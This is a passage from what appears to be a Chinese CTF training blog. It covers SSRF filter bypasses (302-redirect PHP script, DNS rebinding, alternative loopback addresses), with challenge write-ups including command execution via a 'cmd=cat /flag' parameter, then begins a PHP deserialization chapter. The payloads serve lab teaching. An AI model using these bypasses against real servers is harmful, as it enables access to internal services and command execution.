<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 核心：返回302状态码，并重定向到被禁止的地址（比如127.0.0.1/flag）</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag&quot;</span>); <span class="comment">// 要跳转的目标地址（题目里被禁的）</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 302 Moved Temporarily&quot;</span>); <span class="comment">// 发送302重定向响应</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><em>(解释：谁访问这个__redirect.php</em><em>，谁就会被 302 重定向到__127.0.0.1&#x2F;flag</em><em>。)</em></p>
<h4 id="步骤-2：构造-SSRF-Payload（传给靶机）"><a href="#步骤-2：构造-SSRF-Payload（传给靶机）" class="headerlink" title="步骤 2：构造 SSRF Payload（传给靶机）"></a>步骤 2：构造 SSRF Payload（传给靶机）</h4><p>靶机的 SSRF 接口是 <code>ssrf.php?url=</code>，你传：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://靶机IP/ssrf.php?url=http://你的服务器IP/redirect.php</span><br></pre></td></tr></table></figure>

<h4 id="步骤-3：靶机的执行过程"><a href="#步骤-3：靶机的执行过程" class="headerlink" title="步骤 3：靶机的执行过程"></a>步骤 3：靶机的执行过程</h4><ol>
<li>靶机检测你传的 URL：<code>http://你的服务器IP/redirect.php</code> → 不含 127.0.0.1，通过黑名单；</li>
<li>靶机用 cURL 访问你的 <code>redirect.php</code> → 你的服务器返回 302，告诉靶机 “去访问 127.0.0.1&#x2F;flag”；</li>
<li>靶机的 cURL 默认会跟随 302 跳转（因为代码里通常有 <code>CURLOPT_FOLLOWLOCATION=true</code>），直接访问 <code>127.0.0.1/flag</code>；</li>
<li>靶机读取 flag 内容，返回给你 → 绕过成功！</li>
</ol>
<h3 id="DNS-重绑定绕过"><a href="#DNS-重绑定绕过" class="headerlink" title="DNS 重绑定绕过"></a>DNS 重绑定绕过</h3><p>不太容易实操，放一张图吧</p>
<p><img src="/images/VwISbh10JoS0LZxtHaLcLMISnVV.png"></p>
<p>使用第三方工具利用解析间隙重改 ip</p>
<p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
<p>A,B 分别输合法 ip，不合法 ip，访问新生成的网址即可</p>
<p><em>效果类比：你访问 <strong>wwfcww.xyz</strong> 这个域名，第一次解析的 IP 是 192.168.0.1；而第二次解析的 IP 是 127.0.0.1，如此一来即可进行 SSRF 攻击。</em></p>
<p>第三节第二个实验已经有举例了，复习的时候可以看看</p>
<p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/QmDhwYaO1iCfZwkQqHycUtNzngP#share-OOjgd2U0bokiGhxMHXFcFQ4knPe">[Week9.3]实验:SSRF 漏洞实践</a></p>
<h1 id="Week9-3-实验-SSRF-漏洞实践"><a href="#Week9-3-实验-SSRF-漏洞实践" class="headerlink" title="[Week9.3]实验:SSRF 漏洞实践"></a>[Week9.3]实验:SSRF 漏洞实践</h1><h2 id="newstarctf2025-MyGO"><a href="#newstarctf2025-MyGO" class="headerlink" title="newstarctf2025 MyGO!!!"></a>newstarctf2025 MyGO!!!</h2><p>拿到题目发现没什么回显，右击查看源码</p>
<p><img src="/images/SmDFbSX7Wo3NVYxfK9ic3BXinGf.png"></p>
<p>应该每个按钮相当于给 url 赋了值，红框框的地方也很可疑，照这样 payload 看看先</p>
<p><img src="/images/VUFYbzz0co5COTxK7SDcZUjYnpb.png"></p>
<p>回显 提示错误 URL</p>
<p><img src="/images/RSt9b7q6SoYBVFxDG38ctTB1n2b.png"></p>
<p>源码中 flag 的 URL 是 <a target="_blank" rel="noopener" href="http://localhost/">http://localhost/</a>??? 先试试 flag.php</p>
<p>回显了一道新题</p>
<p><img src="/images/QKgkb7qYmoL1plxhczycejqunbg.png"></p>
<p>利用服务器读 url，传 file 伪协议即可.</p>
<p><img src="/images/W6blbF5fqo8FGoxBo0NcsHb0nOc.png"></p>
<h2 id="NSSRound-28-Team-ez-ssrf"><a href="#NSSRound-28-Team-ez-ssrf" class="headerlink" title="[NSSRound#28 Team]ez_ssrf"></a>[NSSRound#28 Team]ez_ssrf</h2><p>看题，题目中还提示了”flag 在&#x2F;flag 路由中 “</p>
<p><img src="/images/EL8fb8YFCoQQvixR4uocST6nnNb.png"></p>
<p>读了读代码，发现它绕过了 127.0.0.1 和 ipv6 形式::1，试了试各种进制绕过，发现并不好使</p>
<p><img src="/images/Q9kNbOczPov19NxtkfIcYDm6nhf.png"></p>
<p>302 重定向绕过需要搭 VPS，暂时还不打算搞，于是尝试了一下 DNS 重绑定绕过，运行是通过的:</p>
<h3 id="法一-DNS-重绑定绕过"><a href="#法一-DNS-重绑定绕过" class="headerlink" title="法一 DNS 重绑定绕过"></a>法一 DNS 重绑定绕过</h3><p>先复习一下 DNS 重绑定的原理:利用两次解析的短暂间隙</p>
<p><img src="/images/Ws27bMGXAodFyIxkTulcPtv4nTe.png"></p>
<p>工具如下:</p>
<p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
<p>我们输入可以正常访问的 192.168.1.1 和需要解析的 127.0.0.1，生成了一个新网址</p>
<p><img src="/images/DjJob49yrokblGxJDfzcltj7nJe.png"></p>
<p>复制这个网址尝试 payload:?url&#x3D;<a target="_blank" rel="noopener" href="http://7f000001.c0a80001.rbndr.us/flag">http://7f000001.c0a80001.rbndr.us/flag</a></p>
<p><img src="/images/FYf6bIOGFoTc7oxtUYqcGS74nZd.png"></p>
<p>上图可知第一次并没有成功，多刷新几次，运行通过!</p>
<p><img src="/images/AQSubUzfEoIHLGxvxoZcgRDYn6b.png"></p>
<h3 id="法二-回环地址的不唯一性"><a href="#法二-回环地址的不唯一性" class="headerlink" title="法二 回环地址的不唯一性"></a>法二 回环地址的不唯一性</h3><p>问了下学过计网的研究生学长（没接触 CTF），他说回环地址不唯一，ip 直接输 0 或者 127.x.y.z，xyz 为合理的任意值都属于回环地址</p>
<p><img src="/images/JNGjbZhg5oleQLxh9eicItvKnYb.png"></p>
<p>于是就有了新解</p>
<p><img src="/images/FBuDbZ9KCobxKUxDwFwcsFeDnwh.png"></p>
<p><img src="/images/RsT5bSm1uopOeExfoS6c4K0ynmg.png"></p>
<h2 id="DNS-想要玩"><a href="#DNS-想要玩" class="headerlink" title="DNS 想要玩"></a>DNS 想要玩</h2><p>读题，代码都没换行，咱们先给他换个行</p>
<p><img src="/images/SrgSbdhCzoi5GexiHSDcPljRned.png"></p>
<p>换行以后:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask, request</span><br><span class="line"><span class="keyword">from</span> urllib.parse import urlparse</span><br><span class="line">import socket</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">BlackList=[</span><br><span class="line">    <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;172&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;gopher&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dict&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tcp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;114.5.1.4&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">check</span>(url):</span><br><span class="line">    url = <span class="title function_ invoke__">urlparse</span>(url)</span><br><span class="line">    host = url.hostname</span><br><span class="line">    host_acscii = host.<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;idna&#x27;</span>).<span class="title function_ invoke__">decode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> socket.<span class="title function_ invoke__">gethostbyname</span>(host_acscii) == <span class="string">&#x27;114.5.1.4&#x27;</span></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">open</span>(__file__).<span class="title function_ invoke__">read</span>()</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/ssrf&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">ssrf</span>():</span><br><span class="line">    raw_url = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> not raw_url:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;URL Needed&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> u in BlackList:</span><br><span class="line">        <span class="keyword">if</span> u in raw_url:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invaild URL&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_ invoke__">check</span>(raw_url):</span><br><span class="line">        <span class="keyword">return</span> os.<span class="title function_ invoke__">popen</span>(request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;cmd&#x27;</span>)).<span class="title function_ invoke__">read</span>()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NONONO&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>

<p>这里面有几个 @app.route 意思是访问这个目录就会执行这个函数，如果黑名单查询通过了，就会执行 get 形式提交的 cmd 命令，还用到了 os 模块</p>
<p>那访问下&#x2F;ssrf 呗?</p>
<p><img src="/images/MrJUb4N0uo0FTyxb4yWcLdOgn5f.png"></p>
<p>他说需要一个 url,我们给 127.0.0.1,提示内部错误</p>
<p><img src="/images/CJjrbPM4logaqzxYNZMcTJOKnzh.png"></p>
<p>我又读了一下代码，发现 check 这段根本不是在做黑名单检测，而是可能在前端进行重定向(?)，通过黑名单检测后，自动转成 114.5.1.4</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">BlackList=[</span><br><span class="line">    <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;172&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;gopher&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dict&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tcp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;114.5.1.4&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url</span>):</span><br><span class="line">    url = urlparse(url)</span><br><span class="line">    host = url.hostname</span><br><span class="line">    host_acscii = host.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> socket.gethostbyname(host_acscii) == <span class="string">&#x27;114.5.1.4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssrf&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssrf</span>():</span><br><span class="line">    raw_url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> raw_url:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;URL Needed&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> BlackList:</span><br><span class="line">        <span class="keyword">if</span> u <span class="keyword">in</span> raw_url:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invaild URL&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> check(raw_url):</span><br><span class="line">        <span class="keyword">return</span> os.popen(request.args.get(<span class="string">&#x27;cmd&#x27;</span>)).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NONONO&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>

<p>打开 DNS 工具，试一下利用重绑定绕过</p>
<p><img src="/images/Y34FbwkePoYn3zxIMVwcBzLLnsf.png"></p>
<p>?url&#x3D;<a target="_blank" rel="noopener" href="http://72050104.7f000001.rbndr.us&cmd=cat/">http://72050104.7f000001.rbndr.us&amp;cmd=cat</a> &#x2F;flag 刷新几次运行通过</p>
<p><img src="/images/AscobXuzeoEN5yxIcknc5vZxnB0.png"></p>
<h3 id="做题启示"><a href="#做题启示" class="headerlink" title="做题启示"></a>做题启示</h3><p>我一直疑惑这题 url 为啥要用 http 请求，一开始不用死活做不出，投给了 AI 他这么回答:</p>
<p><img src="/images/AqIKbWUTKoj2EJxQ1wZckPhOnwg.png"></p>
<p>后面的题目我也不懂什么函数要标准 URL，什么函数不要，那遇到这种情况普遍加个 http 试错吧.</p>
<h2 id="hello-ssrf-Level1-2"><a href="#hello-ssrf-Level1-2" class="headerlink" title="hello-ssrf-Level1-2"></a>hello-ssrf-Level1-2</h2><p>9.2 节<a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/WkNcw9YZUip39xkY5ufcBrGan2v#share-FhDGd0ZkxodbaOxnDFPcD9sKnlh">[Week9.2]SSRF 漏洞利用</a></p>
<h2 id="hello-ssrf-Level3"><a href="#hello-ssrf-Level3" class="headerlink" title="hello-ssrf-Level3"></a>hello-ssrf-Level3</h2><p>按要求复制粘贴发 gopher 协议就行了，注意第一个字符不读取，这里就不重新打一遍了</p>
<h2 id="hello-ssrf-Level4"><a href="#hello-ssrf-Level4" class="headerlink" title="hello-ssrf-Level4"></a>hello-ssrf-Level4</h2><p>靶机似乎有问题，打开和 3 一样</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2026/12/02/%E7%AC%AC%E4%B8%83%E7%AB%A0-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2026/12/02/%E7%AC%AC%E4%B8%83%E7%AB%A0-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">第七章-PHP反序列化</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2026-12-02 12:00:00" itemprop="dateCreated datePublished" datetime="2026-12-02T12:00:00+08:00">2026-12-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2026-01-21 01:53:17" itemprop="dateModified" datetime="2026-01-21T01:53:17+08:00">2026-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/training/" itemprop="url" rel="index"><span itemprop="name">-training</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>飞书链接:<a target="_blank" rel="noopener" href="https://icnewi51k2yp.feishu.cn/wiki/Tcjmwc5RAigdUUk2ZmSc8rfan1c?from=from_copylink">https://icnewi51k2yp.feishu.cn/wiki/Tcjmwc5RAigdUUk2ZmSc8rfan1c?from=from_copylink</a></p>
<h1 id="Week7-1-php-反序列化绪论"><a href="#Week7-1-php-反序列化绪论" class="headerlink" title="[Week7.1]php 反序列化绪论"></a>[Week7.1]php 反序列化绪论</h1><p>在 Web 安全与 CTF 竞赛中，PHP 反序列化漏洞始终是<strong>高频且核心的考点</strong>—— 它不像文件上传漏洞那样 “直观可见”，却常隐藏在代码逻辑深处，成为突破服务器权限的关键入口。本章我们将围绕这一知识点展开系统学习。</p>
<p><em>注:反序列化靶场在本节作为例题出现过的，本章实验就不会再出现了</em></p>
<h2 id="PHP-类与对象"><a href="#PHP-类与对象" class="headerlink" title="PHP 类与对象"></a>PHP 类与对象</h2><p><em>类和对象也是我们下学期专业课上关于面向对象学习的内容，因此不局限于 CTFweb 知识，再认真学习一些细节</em></p>
<p>反序列化的漏洞围绕 “对象” 展开，先搞懂 PHP 中 “类” 和 “对象” 的基本用法.</p>
<h3 id="什么是-“类”？——-对象的-“模板”"><a href="#什么是-“类”？——-对象的-“模板”" class="headerlink" title="什么是 “类”？—— 对象的 “模板”"></a>什么是 “类”？—— 对象的 “模板”</h3><p>类是用 <code>class</code> 定义的 “蓝图”，包含<strong>属性</strong>（变量，比如 “姓名”“年龄”）和<strong>方法</strong>（函数，比如 “说话”“做事”），举个最简单的例子：</p>
<p><img src="/images/Q9DWbXJRdoVEDOxXxG0cNB6unVd.png"></p>
<ul>
<li>理解：<code>class User</code> 就像一个 “用户模板”，规定了 “用户” 应该有 “名字、年龄” 这些属性，以及 “打招呼” 这个行为。</li>
</ul>
<h3 id="什么是-“对象”？——-类的-“实例”"><a href="#什么是-“对象”？——-类的-“实例”" class="headerlink" title="什么是 “对象”？—— 类的 “实例”"></a>什么是 “对象”？—— 类的 “实例”</h3><p>对象是用 <code>new</code> 关键字创建的 “具体个体”，从 “模板” 生成的 “实际存在的东西”，比如：</p>
<p><img src="/images/DgdkbICwzo5q4RxfdbhcnB01njg.png"></p>
<ul>
<li>关键：每个对象都有自己的属性值，但方法（行为）和类保持一致 —— 就像 “小明”“小红” 都是 “User 类” 的对象，但名字、年龄不同，都能 “打招呼”。</li>
</ul>
<h3 id="知识点核心"><a href="#知识点核心" class="headerlink" title="知识点核心"></a>知识点核心</h3><ul>
<li>类是 “模板”，对象是 “模板造出来的具体东西”；</li>
<li>操作对象时，用 <code>-&gt;</code> 访问属性 &#x2F; 方法（比如 <code>$obj-&gt;属性名</code>、<code>$obj-&gt;方法名()</code>）。</li>
</ul>
<p><u>下面我们将用几个反序列化靶场的关卡,巩固一下类和对象相关知识</u></p>
<h2 id="反序列化靶场-Level1-类的实例化"><a href="#反序列化靶场-Level1-类的实例化" class="headerlink" title="*[反序列化靶场]Level1-类的实例化"></a>*[反序列化靶场]Level1-类的实例化</h2><p>先读代码，我们要把 FLAG 类进行实例化，因为 <code>$_POST[&#39;code&#39;]</code> 获取的是 HTTP 请求中传递的「文本数据」，PHP 会默认把它解析为字符串类型（哪怕你传的是数字、代码，本质也是字符串）</p>
<p>所以 code 一开始会被赋成一个字符串(<code>$_POST</code>（以及 <code>$_GET</code>&#x2F;<code>$_REQUEST</code>）返回的永远是字符串（或数组）)，我们需要用后面的 eval 函数来执行 php 代码(而非 lunix 代码,lunix 代码不能用 eval 执行)，从而创建一个 FLAG 类对象.</p>
<p>我们 post:code&#x3D;new FLAG(); 注意这是一行命令，所以末尾要加分号</p>
<p>eval 函数随即执行此条命令，FLAG 类的新对象被创建.</p>
<p>但在这里要注意的是，新创建的对象是匿名对象(会立即被销毁，触发析构函数，但也会触发构造函数 construct)，而非名为 code，code 只作为命令被执行.</p>
<p>读代码，每个对象的 flag 属性是相同的，触发构造函数时，这个相同的属性就会被打印，这就是 flag</p>
<p><img src="/images/FAntbhPC4oOGlWxMobWcBj2anhb.png"></p>
<p><img src="/images/T8iHbmRvRosn1Yxxfp7cvzBbn1f.png"></p>
<h4 id="拓展-给变量命名的情况"><a href="#拓展-给变量命名的情况" class="headerlink" title="拓展:给变量命名的情况"></a>拓展:给变量命名的情况</h4><p>如果我们给这个变量命名，还能拿到 flag 吗?</p>
<p>显然是可以的 因为拿 flag 的关键是构造函数的触发</p>
<p><em>注，这里输入的 code&#x3D;<strong>$obj&#x3D;new FLAG()</strong>;”<strong>$obj&#x3D;new FLAG()</strong>“会以纯文本形式被 PHP 接收，而不会被当做赋值运算符的运算表达式从右到左执行,为 code 直接赋对象 FLAG（__$code__始终是字符串，不是对象）</em></p>
<p><img src="/images/N6tKbQefno9qBLxNuYMclJLYnRb.png"></p>
<h2 id="反序列化靶场-Level2-值的传递"><a href="#反序列化靶场-Level2-值的传递" class="headerlink" title="*[反序列化靶场]Level2-值的传递"></a>*[反序列化靶场]Level2-值的传递</h2><p>读代码，这里是最终打印对象 target 的属性 free_flag.</p>
<p><img src="/images/FtvpbRTuKoQEqyxrHCJcs0grnph.png"></p>
<p>这里需要给 target 中的 free_flag 赋值成$flag_string的值,让它打印$flag_string 即可</p>
<p><img src="/images/HBhtbfoUwoRKG8xLguEcxFZynac.png"></p>
<h2 id="反序列化靶场-Level3-值的权限"><a href="#反序列化靶场-Level3-值的权限" class="headerlink" title="*[反序列化靶场]Level3-值的权限"></a>*[反序列化靶场]Level3-值的权限</h2><p>先来了解下值的权限</p>
<p><img src="/images/EGTjbmsoIokRusxPD1Tcm0Tcngd.png"></p>
<p>何为“子类能访问”?</p>
<p>一创建一个类的子类，它就具有父类除 private 以外的全部成员变量和成员函数，“访问” 就是「读取 &#x2F; 修改 &#x2F; 调用」。</p>
<p>对于 public，我们可以在类的大括号外用”类变量名-&gt; 成员变量名”随便访问，输类变量名-&gt; 成员变量名即可。</p>
<p>对于 protected，在类外即主函数部分，我们不得不先在类内创建成员函数，通过成员函数中的”类变量名-&gt; 成员变量名”加上外部对本成员函数的调用实现间接性的访问，而在类内(尤其是创建成员函数)则直接用”类变量名-&gt; 成员变量名”访问即可。</p>
<p>对于 private，则既需要用 protected 的方法访问成员，还要求访问的就是本类的成员而非父类的成员(因为子类根本不继承父类的成员变量和成员函数)</p>
<p>阅读本题(从第 58 行开始是网页回显),我们发现 flag 被拆成了三份，分别是 public，protected，private 级别的对象.</p>
<p>**注:类的成员函数（方法）如果不显式声明修饰符（public&#x2F;protected&#x2F;private），默认就是 **<strong>public</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 3 : 对象中值的权限 ---  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：尝试将flag传递出来~ </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬 </span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30 </span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs </span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com </span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$public_flag</span> = <span class="string">&quot;NSSCTF&#123;?&quot;</span>; </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$protected_flag</span> = <span class="string">&quot;?&quot;</span>; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$private_flag</span> = <span class="string">&quot;?&#125;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_protected_flag</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_flag; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_private_flag</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_flag; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubFLAG</span> <span class="keyword">extends</span> 